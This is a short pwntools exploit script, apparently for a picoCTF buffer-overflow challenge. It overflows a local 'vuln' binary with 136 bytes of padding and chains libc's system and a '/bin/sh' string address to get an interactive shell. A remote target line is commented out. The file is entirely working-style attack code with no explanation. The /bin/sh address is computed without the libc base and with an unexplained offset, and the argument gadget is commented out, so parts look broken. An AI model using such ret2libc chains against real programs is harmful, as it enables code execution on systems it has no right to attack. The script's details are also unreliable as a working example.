from pwn import *


libc = ELF("libc.so.6")
libc_base_addr = 0x7ffff7bd6000
system_addr = libc_base_addr + libc.sym["system"]
sh_addr = next(libc.search(b"/bin/sh")) - 64
exit_addr = libc_base_addr + libc.sym["exit"]

log.info("libc base address: %s", hex(libc_base_addr))
log.info("offset of system: %s", hex(system_addr))
log.info("offset of /bin/sh: %s", hex(sh_addr))

local = ELF("vuln")
rop = ROP(local)

rop.raw(b"a" * 136)
# rop.raw((rop.find_gadget(['pop rdi', 'ret']))[0])
rop.raw(p64(system_addr))
rop.raw(p64(sh_addr))

log.info("payload: %s", rop.dump())

# p = remote("mercury.picoctf.net", 62289)
p = process(["valgrind", "./vuln"])
p.sendline(rop.chain())
p.interactive()
